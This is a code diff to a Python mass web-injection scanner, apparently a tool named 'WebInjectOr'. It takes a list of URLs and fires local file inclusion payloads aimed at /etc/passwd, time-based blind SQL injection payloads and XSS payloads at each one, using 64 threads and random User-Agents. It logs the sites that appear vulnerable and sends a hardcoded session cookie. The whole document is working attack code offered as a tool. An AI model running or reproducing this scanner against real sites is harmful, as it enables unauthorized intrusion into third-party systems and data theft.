@@ -15,6 +15,7 @@ OKGREEN = '\033[92m'
 WARNING = '\033[93m'
 FAIL = '\033[91m'
 CYAN = '\033[01;36m'
+BOLD = '\033[1m'
 ENDC = '\033[0m'
 
 
@@ -23,7 +24,7 @@ def usage():
         print(OKBLUE+'Usage : python ' + str(sys.argv[0])+' links.txt'+ENDC)
     except:
         pass
-    
+
 
 try:
     with codecs.open(sys.argv[1], mode='r', encoding='ascii', errors='ignore') as f:
@@ -37,13 +38,16 @@ ooo = list((ooo))
 
 
 def banner():
-    print(CYAN+'------Coded--By-------------------')
-    print('    __  __      __      __ __ ')
-    print('   / / / /___  / /___ _/ //_/___ ')
-    print('  / /_/ / __ \\/ / __ `/ ,< / __ \\')
-    print(' / __  / /_/ / / /_/ / /| / /_/ /')
-    print("/_/ /_/\\____/_/\\__,_/_/ |_\\____/ \n\n")
-
+    print(CYAN+'--------------------------------------------------------------')
+    print(' __          __  _    _____       _           _    ____       ')
+    print(' \\ \\        / / | |  |_   _|     (_)         | |  / __ \\      ')
+    print('  \\ \\  /\\  / /__| |__  | |  _ __  _  ___  ___| |_| |  | |_ __ ')
+    print('   \\ \\/  \\/ / _ \\ \'_ \\ | | | \'_ \\| |/ _ \\/ __| __| |  | | \'__|')
+    print("    \\  /\\  /  __/ |_) || |_| | | | |  __/ (__| |_| |__| | |   ")
+    print("     \\/  \\/ \\___|_.__/_____|_| |_| |\\___|\\___|\\__|\\____/|_|   ")
+    print("                                _/ |                          ")
+    print("                               |__/                           ")
+    print("--------------------------------------------------------------"+ENDC)
 
 user_agent_list = [
 
@@ -144,25 +148,40 @@ def createSqliUrl(url):
                 with open('sqlscan-v2-results.txt', 'a') as file1:
                     file1.write(newUrl2+"\n")
                 break
-            
+
             # LFI Payloads for exploiting...
-            lfipayloads = {"../../../../../../etc/passwd","....//....//....//....//....//....//etc//passwd","../../../../../../etc/passwd%00"}
+            lfipayloads = {"../../../../../../etc/passwd",
+                           "....//....//....//....//....//....//etc//passwd", "../../../../../../etc/passwd%00"}
             # SQLi Payloads for exploiting...
             payloads = ["if(now()=sysdate(),sleep(5),0)", "0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z",
                         "'XOR(if(now()=sysdate(),sleep(5),0))XOR'", "(select(0)from(select(sleep(5)))v)/'+(select(0)from(select(sleep(5)))v)+'\""]
+
+            # XSS Payloads for exploiting...
+            xssPayloads = ["<script>alert(123);</script>",
+                           "<ScRipT>alert(\"XSS\");</ScRipT>",
+                           "<script>alert(123)</script>",
+                           "\"><script>alert(\"XSS\")</script>",
+                           "</script><script>alert(1)</script>",
+                           "<BODY BACKGROUND=\"javascript:alert('XSS')\">"]
+            
+            for payload in xssPayloads:
+                paramXxploitStr = paramStr+payload
+                xurl = url.replace(paramStr, paramXxploitStr)
+                if(xssFind(xurl, payload) == "exploited"):
+                    break
 
             # Check for Blind SQLi, with Payloads.
             for payload in payloads:
                 paramZxploitStr = paramStr+payload
                 zurl = url.replace(paramStr, paramZxploitStr)
                 if(blindSQLi(zurl) == "exploited"):
-                    break 
+                    break
             # Check for Local File Inclusion (LFI), with Payloads.
             for lpayload in lfipayloads:
                 paramZxploitStr = param[0]+"="+lpayload
                 zurl = url.replace(paramStr, paramZxploitStr)
                 if(getLFI(zurl) == "exploited"):
-                    break 
+                    break
         except:
             pass
 
@@ -172,17 +191,23 @@ def getLFI(link):
     This function is created to exploit Local File Inclusion on the Link Provided as paramater
     """
     try:
+        cookies = {"pma_lang": "en", "security": "low",
+                   "PHPSESSID": "c506hvlrjm8n5o06n365bd46qp"}
         user_agent = random.choice(user_agent_list)
         headers = {'User-Agent': user_agent}
-        request = requests.get(link, headers=headers, verify=False)
+        request = requests.get(link, headers=headers,
+                               verify=False, cookies=cookies)
         string = "root:x:"
         error = "include(../etc/passwd)"
         if error in request.text:
-            print(OKGREEN+"[+LFI+]  "+ENDC+link+OKBLUE+"   Knock, Knock, Knock Neo it's VULNAREBLE..."+ENDC)
+            print(BOLD+WARNING+"[#][LFI-CHECK]  "+ENDC+link+OKGREEN +
+                  "   Maybe it's Vulnerable..."+ENDC)
         else:
-            print(FAIL+"[-LFI-]  "+ENDC+link+FAIL+"   NO White Rabbit Found..."+ENDC)
+            print(BOLD+FAIL+"-[LFI-FAIL]-  "+ENDC+link+FAIL +
+                  "   "+ENDC)
         if request.status_code == 200 and string in request.text:
-            print(CYAN+"[*LFI*INFO*]  "+ENDC+link+CYAN+"   <ROSE> White Rabbit <ROSE>"+ENDC)
+            print(BOLD+OKGREEN+"+[LFI-INFO]+  "+ENDC+link+OKGREEN +
+                  "   Vulnerable"+ENDC)
             with open("lfiResults.txt", "a") as fil:
                 fil.write(link+"\n")
             return "exploited"
@@ -195,21 +220,27 @@ def getLFI(link):
     except:
         pass
 
+
 def blindSQLi(link):
     """
     This function is created to exploit Blind SQL Injection on the Link Provided as paramater
     """
     try:
-        user_agent = random.choice(user_agent_list) # Change User Agent at each Request.
+        cookies = {"pma_lang": "en", "security": "low",
+                   "PHPSESSID": "c506hvlrjm8n5o06n365bd46qp"}
+        # Change User Agent at each Request.
+        user_agent = random.choice(user_agent_list)
         headers = {'User-Agent': user_agent}
-        request = requests.get(link, headers=headers, verify=False)
+        request = requests.get(link, headers=headers,
+                               verify=False, cookies=cookies)
         if (request.status_code == 200) and (request.elapsed.total_seconds() >= 5):
-            print(OKBLUE+"[*BLIND*INFO*]  "+ENDC+link+OKBLUE+"   <ROSE> White Rabbit <ROSE>"+ENDC)
+            print(BOLD+OKGREEN+"+[BLIND-INFO]+  "+ENDC+link +
+                  OKGREEN+"   Vulnerable"+ENDC)
             with open("blindSQLiResults.txt", "a") as fil1:
                 fil1.write(link+"\n")
             return "exploited"
         else:
-            print(WARNING+"[BLIND]  "+ENDC+link+WARNING+"   No White Rabbit..."+ENDC)
+            print(BOLD+WARNING+"[#][BLIND-CHECK]  "+ENDC+link)
             return "notyet"
     except KeyboardInterrupt:
         sys.exit()
@@ -218,54 +249,80 @@ def blindSQLi(link):
     except:
         pass
 
+def xssFind(link, payload):
+    """
+    This function is created to exploit Cross Site Scripting (XSS) Vulnerability on the Link Provided as paramater & the payloads.
+    """
+    try:
+        # Change User Agent at each Request.
+        user_agent = random.choice(user_agent_list)
+        headers = {'User-Agent': user_agent}
+        request = requests.get(link, headers=headers,
+                               verify=False)
+        if payload in request.content:
+            print(BOLD+OKGREEN+"+[XSS-INFO]+  "+ENDC+link +
+                  OKGREEN+"   Vulnerable"+ENDC)
+            with open("xssResults.txt", "a") as fil1:
+                fil1.write(link+"\n")
+            return "exploited"
+        else:
+            print(BOLD+FAIL+"-[XSS-CHECK]-  "+ENDC+link)
+            return "notyet"
+    except KeyboardInterrupt:
+        sys.exit()
+    # except IOError as io:
+    #     print(io)
+    except:
+        pass
 
 def checkSqli(url):
     """
     This function is created to check SQL Injection at the url provided as parameter
     """
-    r = requests.get(url, verify=False, timeout=10)
-    print(FAIL+"[+]  "+ENDC+url+CYAN +
-          "\t<TUNNEL> KNOCK, KNOCK, KNOCK <TUNNEL>"+ENDC)
+    cookies = {"pma_lang": "en", "security": "low",
+               "PHPSESSID": "c506hvlrjm8n5o06n365bd46qp"}
+    r = requests.get(url, verify=False, timeout=10, cookies=cookies)
+    print(WARNING+"[#][SQL-CHECK]  "+ENDC+url)
     html = r.content
     for regg in MySQL:
         if(re.search(regg, html)):
-            print(CYAN+"[INFO]  "+ENDC+url+CYAN +
-                  "\t<TREE> Neo, Follow The White Rabbit <TREE>"+ENDC)
+            print(OKGREEN+"+[SQL-INFO]+  "+ENDC+url+OKGREEN +
+                  "\t Vulnerable"+ENDC)
             return "done"
     for regg in PostgreSQL:
         if(re.search(regg, html)):
-            print(CYAN+"[INFO]  "+ENDC+url+CYAN +
-                  "\t<TREE> Neo, Follow The White Rabbit <TREE>"+ENDC)
+            print(OKGREEN+"+[SQL-INFO]+  "+ENDC+url+OKGREEN +
+                  "\t Vulnerable"+ENDC)
             return "done"
     for regg in MicrosoftSQLServer:
         if(re.search(regg, html)):
-            print(CYAN+"[INFO]  "+ENDC+url+CYAN +
-                  "\t<TREE> Neo, Follow The White Rabbit <TREE>"+ENDC)
+            print(OKGREEN+"+[SQL-INFO]+  "+ENDC+url+OKGREEN +
+                  "\t Vulnerable"+ENDC)
             return "done"
     for regg in MicrosoftAccess:
         if(re.search(regg, html)):
-            print(CYAN+"[INFO]  "+ENDC+url+CYAN +
-                  "\t<TREE> Neo, Follow The White Rabbit <TREE>"+ENDC)
+            print(OKGREEN+"+[SQL-INFO]+  "+ENDC+url+OKGREEN +
+                  "\t Vulnerable"+ENDC)
             return "done"
     for regg in Oracle:
         if(re.search(regg, html)):
-            print(CYAN+"[INFO]  "+ENDC+url+CYAN +
-                  "\t<TREE> Neo, Follow The White Rabbit <TREE>"+ENDC)
+            print(OKGREEN+"+[SQL-INFO]+  "+ENDC+url+OKGREEN +
+                  "\t Vulnerable"+ENDC)
             return "done"
     for regg in dIBMDB2:
         if(re.search(regg, html)):
-            print(CYAN+"[INFO]  "+ENDC+url+CYAN +
-                  "\t<TREE> Neo, Follow The White Rabbit <TREE>"+ENDC)
+            print(OKGREEN+"+[SQL-INFO]+  "+ENDC+url+OKGREEN +
+                  "\t Vulnerable"+ENDC)
             return "done"
     for regg in SQLite:
         if(re.search(regg, html)):
-            print(CYAN+"[INFO]  "+ENDC+url+CYAN +
-                  "\t<TREE> Neo, Follow The White Rabbit <TREE>"+ENDC)
+            print(OKGREEN+"+[SQL-INFO]+  "+ENDC+url+OKGREEN +
+                  "\t Vulnerable"+ENDC)
             return "done"
     for regg in Sybase:
         if(re.search(regg, html)):
-            print(CYAN+"[INFO]  "+ENDC+url+CYAN +
-                  "\t<TREE> Neo, Follow The White Rabbit <TREE>"+ENDC)
+            print(OKGREEN+"+[SQL-INFO]+  "+ENDC+url+OKGREEN +
+                  "\t Vulnerable"+ENDC)
             return "done"
 
 
@@ -275,13 +332,14 @@ def threads():
     """
     try:
         start = timer()
-        check = Pool(24)
+        check = Pool(64)
         check.map(createSqliUrl, ooo)
-        print(WARNING+'[*]  Time: ' + str(timer() - start) + ' seconds'+ENDC)
+        print(BOLD+CYAN+'[*]  Time: ' + str(timer() - start) + ' seconds'+ENDC)
 
     except KeyboardInterrupt:
         sys.exit()
 
 
 if __name__ == '__main__':
+    banner()
     threads()
